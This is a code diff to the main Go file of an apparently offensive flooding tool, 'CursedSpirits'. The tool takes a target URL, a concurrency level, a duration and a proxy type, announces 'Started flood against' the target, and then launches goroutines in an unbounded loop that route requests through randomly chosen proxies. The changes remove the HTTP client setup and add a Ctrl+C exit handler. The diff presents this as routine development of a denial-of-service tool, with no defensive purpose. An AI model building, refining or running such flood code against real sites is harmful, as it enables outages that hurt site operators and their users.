@@ -4,13 +4,13 @@ import (
 	"fmt"
 	"log"
 	"math/rand"
-	"net/http"
 	"os"
+	"os/signal"
 	"path/filepath"
 	"runtime"
 	"slices"
 	"strings"
-	"sync"
+	"syscall"
 	"time"
 
 	"Pix4Devs/CursedSpirits/bot"
@@ -93,28 +93,25 @@ func main() {
 		Target:      *TARGET,
 		Concurrency: *CONCURRENCY,
 		StopAt:      int(time.Now().Add(time.Second * time.Duration(*DURATION)).Unix()),
-		Client: &http.Client{
-			Jar:     http.DefaultClient.Jar,
-			Timeout: time.Duration(time.Second * 20),
-		},
 		Protocol: *PROXY_TYPE,
-		Mx:       sync.Mutex{},
 	}
 
 	fancy.PrintCtx("Started flood against '" + *TARGET + "'")
 	fmt.Println()
 
+
+	exit := make(chan os.Signal) 
+	signal.Notify(exit, os.Interrupt, syscall.SIGINT)
+
+	// setup one listener for signal interruption like ctrl+c
+	go func(){
+		<-exit
+		fancy.PrintCtx("Called exit signal, exiting soon.")
+		os.Exit(0)
+	}()
+
 	for {
 		go func() {
-			// ==================
-			// reset tcp cache state
-			// refer to godoc:
-			//
-			// The [Client.Transport] typically has internal state (cached TCP connections), so Clients should be reused instead of created as needed.
-			// Clients are safe for concurrent use by multiple goroutines.
-			// ==================
-			f.Client.Transport = http.DefaultTransport
-
 			f.Jujutsu(globals.PROXIES[rand.Intn(len(globals.PROXIES))])
 		}()
 	}
